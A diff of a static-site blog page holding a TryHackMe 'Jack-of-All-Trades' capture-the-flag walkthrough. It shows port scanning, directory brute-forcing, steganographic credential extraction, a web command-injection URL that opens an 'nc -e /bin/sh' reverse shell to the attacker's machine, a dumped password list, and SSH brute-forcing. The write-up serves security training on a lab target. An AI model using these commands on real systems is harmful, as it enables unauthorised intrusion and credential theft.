@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Jack-of-All-Trades [TryHackMe] – Blog</title>
+    <title>Jack-of-All-Trades [TryHackMe] – Martin Kubecka | Blog</title>
     
 
 
@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1335,7 +1335,7 @@
 <meta name="author" content="Martin Kubecka">
 
 
-<meta property="og:site_name" content="Blog">
+<meta property="og:site_name" content="Martin Kubecka | Blog">
 <meta property="og:title" content="Jack-of-All-Trades [TryHackMe]">
 <meta property="og:url" content="https://martinkubecka.github.io/posts/thm/jack-of-all-trades/">
 <meta property="og:type" content="article">
@@ -1345,12 +1345,12 @@
     <meta property="og:image" content="https://martinkubecka.github.io/images/thm/jack-of-all-trades/icon.jpeg">
     <meta property="og:image:url" content="https://martinkubecka.github.io/images/thm/jack-of-all-trades/icon.jpeg">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:app:name:iphone" content="Blog">
+    <meta name="twitter:app:name:iphone" content="Martin Kubecka | Blog">
     <meta property="twitter:title" content="Jack-of-All-Trades [TryHackMe]">
     <meta property="twitter:description" content="Boot-to-root originally designed for Securi-Tay 2020">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.93.3" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1398,7 +1398,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Blog",
+      "name": "Martin Kubecka | Blog",
       "url": "https://martinkubecka.github.io/"
     }
   }
@@ -1690,7 +1690,7 @@
   
   <li >
     
-      <a href="https://martinkubecka.github.io/" class="capitalize">Blog</a>
+      <a href="https://martinkubecka.github.io/" class="capitalize">Martin Kubecka | Blog</a>
     
   </li>
   
@@ -1810,7 +1810,7 @@
 <h4 id="nmap">Nmap</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1832,32 +1832,32 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -A -T4 <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-05 12:33 CST
-Stats: 0:00:35 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
-NSE Timing: About 99.28% <span class="k">done</span><span class="p">;</span> ETC: 12:33 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
-Stats: 0:00:53 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
-NSE Timing: About 99.64% <span class="k">done</span><span class="p">;</span> ETC: 12:33 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
-Nmap scan report <span class="k">for</span> 10.10.122.111
-Host is up <span class="o">(</span>0.071s latency<span class="o">)</span>.
-Not shown: <span class="m">998</span> closed ports
-PORT   	STATE 	SERVICE 	VERSION
-22/tcp	open  	http    		Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
-<span class="p">|</span>_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
-<span class="p">|</span>_http-title: Jack-of-all-trades!
-<span class="p">|</span>_ssh-hostkey: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
-80/tcp 	open  	ssh     		OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">1024</span> 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d <span class="o">(</span>DSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">2048</span> 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 <span class="o">(</span>ED25519<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T4 <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-05 12:33 CST
+</span></span><span class="line"><span class="cl">Stats: 0:00:35 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+</span></span><span class="line"><span class="cl">NSE Timing: About 99.28% <span class="k">done</span><span class="p">;</span> ETC: 12:33 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:53 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+</span></span><span class="line"><span class="cl">NSE Timing: About 99.64% <span class="k">done</span><span class="p">;</span> ETC: 12:33 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.122.111
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.071s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   	STATE 	SERVICE 	VERSION
+</span></span><span class="line"><span class="cl">22/tcp	open  	http    		Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Jack-of-all-trades!
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-hostkey: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp 	open  	ssh     		OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">1024</span> 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d <span class="o">(</span>DSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="directory-brute-forcing">Directory Brute-Forcing</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1882,30 +1882,30 @@ PORT   	STATE 	SERVICE 	VERSION
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gobuster dir -u http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>:22 -w /usr/share/wordlists/dirb/common.txt 
-<span class="o">===============================================================</span>
-Gobuster v3.0.1
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.122.111:22
-<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
-<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
-<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
-<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/01/05 12:36:20 Starting <span class="nv">gobuster</span>
-<span class="o">===============================================================</span>
-/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
-/assets <span class="o">(</span>Status: 301<span class="o">)</span>
-/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
-/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
-<span class="o">===============================================================</span>
-2021/01/05 12:36:56 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>:22 -w /usr/share/wordlists/dirb/common.txt 
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.0.1
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.122.111:22
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/05 12:36:20 Starting <span class="nv">gobuster</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/assets <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/05 12:36:56 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -1962,13 +1962,13 @@ If you are using Firefox more on that here: <a href="https://support.mozilla.org
 <p>Source code comment:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--Note to self - If I ever get locked out I can get back in at /recovery.php! --&gt;</span>
-<span class="c">&lt;!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--Note to self - If I ever get locked out I can get back in at /recovery.php! --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Based on the last two characters we know that the note was encoded to base64.</p>
 <p><figure >
@@ -1997,15 +1997,15 @@ If you are using Firefox more on that here: <a href="https://support.mozilla.org
 <p>Source code comment:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--
-</span><span class="c">GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= 
-</span><span class="c">--&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--
+</span></span></span><span class="line"><span class="cl"><span class="c">GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= 
+</span></span></span><span class="line"><span class="cl"><span class="c">--&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -2024,7 +2024,7 @@ Use flag <em>info</em> to check if something was hidden in the jpg image. <br />
 Then <em>extract -sf</em> to extract hidden message.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2047,28 +2047,28 @@ Then <em>extract -sf</em> to extract hidden message.</p>
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">steghide info header.jpg 
-<span class="s2">&#34;header.jpg&#34;</span>:
-  format: jpeg
-  capacity: 3.5 KB
-Try to get information about embedded data ? <span class="o">(</span>y/n<span class="o">)</span> y
-Enter passphrase: 
-steghide: could not extract any data with that passphrase!
-steghide extract -sf header.jpg 
-Enter passphrase: 
-wrote extracted data to <span class="s2">&#34;cms.creds&#34;</span>.
-ls
-total 84K
-drwxr-xr-x <span class="m">12</span> root root 4.0K Jan  <span class="m">5</span> 12:54 ..
--rw-r--r--  <span class="m">1</span> root root  69K Jan  <span class="m">5</span> 12:54 header.jpg
--rw-r--r--  <span class="m">1</span> root root   <span class="m">93</span> Jan  <span class="m">5</span> 12:56 cms.creds
-drwxr-xr-x  <span class="m">2</span> root root 4.0K Jan  <span class="m">5</span> 12:56 .
-cat cms.creds 
-     <span class="m">1</span>  Here you go Jack. Good thing you thought ahead!
-     <span class="m">2</span>
-     <span class="m">3</span>  Username: jackinthebox
-     <span class="m">4</span>  Password: TplFxiSHjY
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">steghide info header.jpg 
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;header.jpg&#34;</span>:
+</span></span><span class="line"><span class="cl">  format: jpeg
+</span></span><span class="line"><span class="cl">  capacity: 3.5 KB
+</span></span><span class="line"><span class="cl">Try to get information about embedded data ? <span class="o">(</span>y/n<span class="o">)</span> y
+</span></span><span class="line"><span class="cl">Enter passphrase: 
+</span></span><span class="line"><span class="cl">steghide: could not extract any data with that passphrase!
+</span></span><span class="line"><span class="cl">steghide extract -sf header.jpg 
+</span></span><span class="line"><span class="cl">Enter passphrase: 
+</span></span><span class="line"><span class="cl">wrote extracted data to <span class="s2">&#34;cms.creds&#34;</span>.
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">total 84K
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">12</span> root root 4.0K Jan  <span class="m">5</span> 12:54 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  69K Jan  <span class="m">5</span> 12:54 header.jpg
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">93</span> Jan  <span class="m">5</span> 12:56 cms.creds
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root 4.0K Jan  <span class="m">5</span> 12:56 .
+</span></span><span class="line"><span class="cl">cat cms.creds 
+</span></span><span class="line"><span class="cl">     <span class="m">1</span>  Here you go Jack. Good thing you thought ahead!
+</span></span><span class="line"><span class="cl">     <span class="m">2</span>
+</span></span><span class="line"><span class="cl">     <span class="m">3</span>  Username: jackinthebox
+</span></span><span class="line"><span class="cl">     <span class="m">4</span>  Password: TplFxiSHjY
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Success! We found credentials for <strong>recovery.php</strong> where we can login.</p>
 <h3 id="gaining-access">Gaining Access</h3>
@@ -2101,7 +2101,7 @@ http://{TARGET MACHINE IP}:22/nnxhweOV/index.php?cmd=nc -e /bin/sh {LOCAL MACHIN
 <p>Before running a nc reverse shell start a listener on the local machine.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2147,51 +2147,51 @@ http://{TARGET MACHINE IP}:22/nnxhweOV/index.php?cmd=nc -e /bin/sh {LOCAL MACHIN
 </span><span class="lnt">44
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lnvp <span class="m">3333</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">3333</span> ...
-connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.122.111<span class="o">]</span> <span class="m">34946</span>
-whoami
-www-data
-python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ <span class="nb">cd</span> /home
-www-data@jack-of-all-trades:/home$ ls -la
-ls -la
-total <span class="m">16</span>
-drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">23</span> root root <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> ..
-drwxr-x---  <span class="m">3</span> jack jack <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> jack
--rw-r--r--  <span class="m">1</span> root root  <span class="m">408</span> Feb <span class="m">29</span>  <span class="m">2020</span> jacks_password_list
-www-data@jack-of-all-trades:/home$ cat jacks_password_list
-cat jacks_password_list
-*hclqAzj+2GC+<span class="o">=</span>0K
-eN&lt;A@n^zI?FE<span class="nv">$I5</span>,
-X&lt;<span class="o">(</span>@zo2XrEN<span class="o">)</span><span class="c1">#MGC</span>
-,,aE1K,nW3Os,afb
-ITMJpGGIqg1jn?&gt;@
-0HguX<span class="o">{</span>,fgXPE<span class="p">;</span>8yF
-sjRUb4*@pz&lt;*ZITu
-<span class="o">[</span>8V7o^gl<span class="o">(</span>Gjt5<span class="o">[</span>WB
-yTq0jI<span class="nv">$d</span><span class="o">}</span>Ka&lt;T<span class="o">}</span>PD
-Sc.<span class="o">[[</span>2pL&lt;&gt;e<span class="o">)</span>vC4<span class="o">}</span>
-9<span class="p">;</span><span class="o">}</span><span class="c1">#q*,A4wd{&lt;X.T</span>
-M41nrFt#PcV<span class="o">=(</span>3%p
-GZx.t<span class="o">)</span>H$<span class="p">&amp;</span>awU<span class="p">;</span>SO&lt;
-.MVettz<span class="o">]</span>a<span class="p">;&amp;</span>Z<span class="p">;</span>cAC
-2fh%i9Pr5YiYIf51
-TDF@mdEd3ZQ<span class="o">(]</span>hBO
-v<span class="o">]</span>XBmwAk8vk5t3EF
-9iYZeZGQGG9<span class="p">&amp;</span>W4d1
-8TIFce<span class="p">;</span>KjrBWTAY^
-SeUAwt7EB#fY<span class="p">&amp;</span>+yt
-n.FZvJ.x9sYe5s5d
-8lN<span class="o">{)</span>g32PG,1?<span class="o">[</span>pM
-z@e1PmlmQ%k5sDz@
-ow5APF&gt;6r,y4krSo
-
-www-data@jack-of-all-trades:/home$ python -m SimpleHTTPServer <span class="m">8000</span>
-python -m SimpleHTTPServer <span class="m">8000</span>
-Serving HTTP on 0.0.0.0 port <span class="m">8000</span> ...
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lnvp <span class="m">3333</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">3333</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.122.111<span class="o">]</span> <span class="m">34946</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ <span class="nb">cd</span> /home
+</span></span><span class="line"><span class="cl">www-data@jack-of-all-trades:/home$ ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">23</span> root root <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> ..
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">3</span> jack jack <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> jack
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">408</span> Feb <span class="m">29</span>  <span class="m">2020</span> jacks_password_list
+</span></span><span class="line"><span class="cl">www-data@jack-of-all-trades:/home$ cat jacks_password_list
+</span></span><span class="line"><span class="cl">cat jacks_password_list
+</span></span><span class="line"><span class="cl">*hclqAzj+2GC+<span class="o">=</span>0K
+</span></span><span class="line"><span class="cl">eN&lt;A@n^zI?FE<span class="nv">$I5</span>,
+</span></span><span class="line"><span class="cl">X&lt;<span class="o">(</span>@zo2XrEN<span class="o">)</span><span class="c1">#MGC</span>
+</span></span><span class="line"><span class="cl">,,aE1K,nW3Os,afb
+</span></span><span class="line"><span class="cl">ITMJpGGIqg1jn?&gt;@
+</span></span><span class="line"><span class="cl">0HguX<span class="o">{</span>,fgXPE<span class="p">;</span>8yF
+</span></span><span class="line"><span class="cl">sjRUb4*@pz&lt;*ZITu
+</span></span><span class="line"><span class="cl"><span class="o">[</span>8V7o^gl<span class="o">(</span>Gjt5<span class="o">[</span>WB
+</span></span><span class="line"><span class="cl">yTq0jI<span class="nv">$d</span><span class="o">}</span>Ka&lt;T<span class="o">}</span>PD
+</span></span><span class="line"><span class="cl">Sc.<span class="o">[[</span>2pL&lt;&gt;e<span class="o">)</span>vC4<span class="o">}</span>
+</span></span><span class="line"><span class="cl">9<span class="p">;</span><span class="o">}</span><span class="c1">#q*,A4wd{&lt;X.T</span>
+</span></span><span class="line"><span class="cl">M41nrFt#PcV<span class="o">=(</span>3%p
+</span></span><span class="line"><span class="cl">GZx.t<span class="o">)</span>H$<span class="p">&amp;</span>awU<span class="p">;</span>SO&lt;
+</span></span><span class="line"><span class="cl">.MVettz<span class="o">]</span>a<span class="p">;&amp;</span>Z<span class="p">;</span>cAC
+</span></span><span class="line"><span class="cl">2fh%i9Pr5YiYIf51
+</span></span><span class="line"><span class="cl">TDF@mdEd3ZQ<span class="o">(]</span>hBO
+</span></span><span class="line"><span class="cl">v<span class="o">]</span>XBmwAk8vk5t3EF
+</span></span><span class="line"><span class="cl">9iYZeZGQGG9<span class="p">&amp;</span>W4d1
+</span></span><span class="line"><span class="cl">8TIFce<span class="p">;</span>KjrBWTAY^
+</span></span><span class="line"><span class="cl">SeUAwt7EB#fY<span class="p">&amp;</span>+yt
+</span></span><span class="line"><span class="cl">n.FZvJ.x9sYe5s5d
+</span></span><span class="line"><span class="cl">8lN<span class="o">{)</span>g32PG,1?<span class="o">[</span>pM
+</span></span><span class="line"><span class="cl">z@e1PmlmQ%k5sDz@
+</span></span><span class="line"><span class="cl">ow5APF&gt;6r,y4krSo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@jack-of-all-trades:/home$ python -m SimpleHTTPServer <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">python -m SimpleHTTPServer <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> ...
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>In the home directory we can find password file which we will download with help of python server.</p>
 <p><figure >
@@ -2208,7 +2208,7 @@ Serving HTTP on 0.0.0.0 port <span class="m">8000</span> ...
 <h3 id="ssh-brute-forcing">SSH Brute-Forcing</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
